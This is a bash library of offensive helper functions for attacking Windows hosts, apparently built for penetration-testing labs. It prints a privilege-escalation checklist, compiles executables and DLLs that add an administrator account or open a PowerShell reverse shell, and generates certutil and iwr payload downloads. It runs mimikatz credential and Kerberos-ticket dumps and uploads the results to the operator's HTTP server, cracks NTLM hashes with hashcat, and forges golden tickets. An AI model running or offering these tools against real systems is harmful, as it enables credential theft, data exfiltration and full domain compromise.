#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
windows_escalate_strategy() {
    echo "If access is not powershell (net cat, winrm), try to get the password via responder"
    echo "start_responder"
    host_ip=$(get_host_ip)
    echo 'dir \\'$host_ip'\test'
    echo 'get_responder_ntlm'
    echo 'get_ntlm_password'
    echo 'If password available and RDP available, log in'
    echo 'run_xfreerdp'
    echo 'shell=$(get_powershell_reverse_shell)'
    echo 'cut and paste into a powershell prompt'
    echo 'alternatively, start a interactive powershell'
    echo "If you have powershell, run the following commands"
    echo "whoami /priv"
    echo "whoami /groups"
    echo "Get-LocalUser"
    echo "Get-LocalGroup"
    echo "Get-LocalGroupMember Administators"
    echo "systeminfo"
    echo "ipconfig /all"
    echo "route print"
    echo "netstat -ano"
    echo 'Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname'
    echo 'Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname'
    echo 'reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s /v DisplayName'
    echo 'Get-Process'
    echo 'tasklist'
    echo 'Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue'
    echo 'dir /s /b | findstr /e "kdbx"'
    echo 'Search suspicious folders'    
    echo 'Get-ChildItem -Path C:\suspected_folder -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue'
    echo 'dir /s /b | findstr /e "txt ini"'
    echo 'Get-History'
    echo '(Get-PSReadlineOption).HistorySavePath'
    echo 'Type the history file'
    echo 'Type the transcript file if any'
    echo 'Use evil-winrm to connect to a ps session'
    echo 'Use automated enumeratio with winPEAS'
    echo 'cp /usr/share/peass/winpeas/winPEASx64.exe .'
    echo '$(generate_iwr "winPEASx64.exe")'
    echo '.\winPEASx64.exe'
    echo "Service Binary Hijacking"
    echo "At this point, you must have a proper powershell session via rdp or otherwise"
    echo 'Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like "Running"}'
    echo 'wmic service where (state="Running") get Name,State,PathName'
    echo 'To see specific logonuser, sc qc servicename'
    echo 'run icacls to see if you have permission to modify/write the files'
    echo 'if you do, create the exe reverse shell'
    echo 'DLL Hijacking'
    echo 'Investigate the applications to see if therei is anything interesting'
    echo 'Unquoted service paths'
    echo 'Get-CimInstance -ClassName win32_service | Select Name,State,PathName'
    echo 'wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """"'
    echo 'net start'
    echo 'Check task scheduler'
    echo 'schtasks /query /fo LIST /v'
    echo 'Use windows exploits'

}

generate_download() {
    generate_certutil "$1"
    generate_iwr "$1"
}

generate_certutil() {
    local file=$1
    if [ -z "$http_ip" ] || [ -z "$http_port" ]; then
        echo "HTTP IP address and port must be set before running certutil."
        return 1
    fi
    echo "certutil -urlcache -f http://$http_ip:$http_port/$file $file ;"
}

generate_iwr() { 
    local file=$1
    local outfile=$2
    if [[ -z $outfile ]]; then
        outfile=$file
    fi
    if [ -z "$http_ip" ] || [ -z "$http_port" ]; then
        echo "HTTP IP address and port must be set before running certutil."
        return 1
    fi
    echo "iwr -uri http://$http_ip:$http_port/$file -OutFile $outfile ;"
}

upload_file() {
    local file=$1
    local infile=$2
    if [[ -z $infile ]]; then
        infile=$file
    fi
    if [ -z "$file" ]; then
        echo "File must be specified for upload."
        return 1
    fi
    echo "iwr -Uri http://$http_ip:$http_port/$file -InFile $infile -Method Put ;"
}

create_add_user() {
    local username="$1"
    local password="$2"
    if [ -z "$username" ]; then
        username="attacker"
    fi
    if [ -z "$password" ]; then
        password="Password123!"
    fi
    cp "$SCRIPTDIR/../c/add_user.c" .
    sed -E -i 's/\{username\}/'"$username"'/g' add_user.c
    sed -E -i 's/\{password\}/'"$password"'/g' add_user.c
    x86_64-w64-mingw32-gcc -o add_user.exe add_user.c 
}

create_add_user_dll() {
    local username="$1"
    local password="$2"
    if [ -z "$username" ]; then
        username="attacker"
    fi
    if [ -z "$password" ]; then
        password="Password123!"
    fi
    cp "$SCRIPTDIR/../c/add_user_dll.cpp" .
    sed -E -i 's/\{username\}/'"$username"'/g' add_user_dll.cpp
    sed -E -i 's/\{password\}/'"$password"'/g' add_user_dll.cpp
    x86_64-w64-mingw32-gcc -shared -o add_user.dll add_user_dll.cpp 
}

create_change_password() {
    local username="$1"
    local password="$2"
    if [ -z "$username" ]; then
        echo "Username is required for changing password."
        exit 1
    fi
    if [ -z "$password" ]; then
        password="Password123!"
    fi
    cp "$SCRIPTDIR/../c/change_password.c" .
    sed -E -i 's/\{username\}/'"$username"'/g' change_password.c
    sed -E -i 's/\{password\}/'"$password"'/g' change_password.c
    x86_64-w64-mingw32-gcc -o change_password.exe change_password.c 
}

download_winPEAS () {
    if [ -f winPEASx64.exe ]; then
        echo "winPEASx64.exe already exists."
    else
        wget https://github.com/peass-ng/PEASS-ng/releases/download/20250701-bdcab634/winPEASx64.exe -O winPEASx64.exe
    fi
    generate_iwr "winPEASx64.exe"
}

escape_sed() {
    local input="$1"
    # Escape special characters for sed
    echo "$input" | sed -E 's/([\/&])/\\\1/g'
}

create_run_windows_shell_exe() {    
    shell=$(get_powershell_reverse_shell $1 $2)
    shell=$(escape_sed "$shell")
    cp "$SCRIPTDIR/../c/run_windows.c" run_windows_shell.c
    sed -E -i 's/\{command\}/'"$shell"'/g' run_windows_shell.c
    x86_64-w64-mingw32-gcc -o run_windows_shell.exe run_windows_shell.c 
}

create_run_windows_shell_dll() {
    shell=$(get_powershell_reverse_shell $1 $2)
    shell=$(escape_sed "$shell")
    cp "$SCRIPTDIR/../c/run_windows_dll.cpp" run_windows_shell_dll.cpp
    sed -E -i 's/\{command\}/'"$shell"'/g' run_windows_shell_dll.cpp
    x86_64-w64-mingw32-gcc -shared -o run_windows_shell.dll run_windows_shell_dll.cpp 
}

create_run_windows_exe() {
    local command="$1"
    if [ -z "$command" ]; then
        echo "Command is required for creating run_windows_exe."
        exit 1
    fi
    command=$(escape_sed "$command")
    cp "$SCRIPTDIR/../c/run_windows.c" run_windows.c
    sed -E -i 's/\{command\}/'"$command"'/g' run_windows.c
    x86_64-w64-mingw32-gcc -o run_windows.exe run_windows_exe.c
}

create_run_windows_dll() {
    local command="$1"
    if [ -z "$command" ]; then
        echo "Command is required for creating run_windows_dll."
        exit 1
    fi
    command=$(escape_sed "$command")
    cp "$SCRIPTDIR/../c/run_windows_dll.cpp" run_windows_dll.cpp
    sed -E -i 's/\{command\}/'"$command"'/g' run_windows_dll.cpp
    x86_64-w64-mingw32-gcc -shared -o run_windows.dll run_windows_dll.cpp
}

get_mimikatz() {
    cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
    generate_iwr "mimikatz.exe"
}

run_mimikatz_logonpasswords() {
    echo '.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit > mimikatz_logonpasswords.txt;'
    echo 'iwr -Uri http://'$http_ip':'$http_port'/mimikatz_logonpasswords.txt -Infile mimikatz_logonpasswords.txt -Method Put;'
}

run_mimikatz_kbtickets() {
    local unc_path="$1"
    if [ -z "$unc_path" ]; then
        echo "UNC path is required for running mimikatz kbtickets."
        exit 1
    fi
    echo '.\mimikatz.exe "privilege::debug" exit;'
    echo 'dir '$unc_path';'
    echo '.\mimikatz.exe "sekurlsa::tickets" exit > mimikatz_tickets.txt;'
    echo 'iwr -Uri http://'$http_ip':'$http_port'/mimikatz_tickets.txt -Infile mimikatz_tickets.txt -Method Put;'
}

run_mimikatz_export_tickets() {
    echo '.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit;'
}

hashcat_ntlm() {
    hash_mode=1000
    hashcat_generic
}

hashcat_generic() {
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes"
    fi
    if [[ ! -f "$hash_file" ]]; then
        echo "$hash_file not found, cannot run hashcat"
        return 1
    fi
    if [[ -z "$hashcat_rule" ]]; then
        hashcat_rule="/usr/share/hashcat/rules/best64.rule"
    fi
    if [[ -z "$hashcat_wordlist" ]]; then
        hashcat_wordlist="/usr/share/wordlists/rockyou.txt"
    fi
    if [[ -z "$hash_mode" ]]; then
        echo "Hash mode must be set before running hashcat."
        return 1
    fi
    echo "$hash_file found, running hashcat for hash mode $hash_mode"
    sudo dos2unix $hash_file
    hashcat -m $hash_mode $hash_file $hashcat_wordlist -r $hashcat_rule --force

}

get_ntlm_hash_from_mimikatz_log_logonpasswords() {
    if [[ -z "$mimikatz_log" ]]; then
        mimikatz_log="mimikatz_logonpasswords.txt"
    fi
    if [[ ! -f "$mimikatz_log" ]]; then
        echo "$mimikatz_log not found, cannot extract NTLM hash"
        return 1
    fi
    if [[ -z "$target_username" ]]; then
        echo "Target username must be set before running."
        return 1
    fi
    if [[ -z "$target_domain" ]]; then
        echo "Target domain must be set before running."
        return 1       
    fi
    sudo dos2unix $mimikatz_log >> /dev/null 2>&1
    awk '
        /'"$target_username"'/ {
            if (getline > 0 && /'"$target_domain"'/) {            
                if (getline > 0 && /NTLM/) {
                    print $4
                }
            }
        }
    ' $mimikatz_log 
}



get_ntlm_hash_from_mimikatz_log_lsadump() {
    if [[ -z "$mimikatz_log" ]]; then
        mimikatz_log="mimikatz_lsadump.txt"
    fi
    if [[ ! -f "$mimikatz_log" ]]; then
        echo "$mimikatz_log not found, cannot extract NTLM hash"
        return 1
    fi
    if [[ -z "$target_username" ]]; then
        echo "Target username must be set before running."
        return 1
    fi
    sudo dos2unix $mimikatz_log >> /dev/null 2>&1
    domain_sid=$(cat $mimikatz_log | grep -oP 'Domain.*/ \K.*')
    ntlm_hash=$(awk '
        /User : '"$target_username"'/ {
            if (getline > 0 && /LM/) {
                if (getline > 0 && /NTLM/) {
                    print $3
                }
            }
        }
    ' $mimikatz_log )
}

get_golden_ticket() {
    target_username=krbtgt
    get_ntlm_hash_from_mimikatz_log_lsadump
    if [[ $? -ne 0 ]]; then
        return 1
    fi
    if [[ -z "$domain_sid" ]]; then
        echo "Domain SID is not set, cannot create golden ticket."
        return 1
    fi
    if [[ -z "$ntlm_hash" ]]; then
        echo "NTLM hash is not set, cannot create golden ticket."
        return 1
    fi
    get_mimikatz
    get_psexec
    echo '.\mimikatz.exe "kerberos::purge" exit'
    echo '.\mimikatz.exe "kerberos::golden /user:'$username' /domain:'$domain' /sid:'$domain_sid' /'$target_username':'$ntlm_hash' /ptt" exit'
}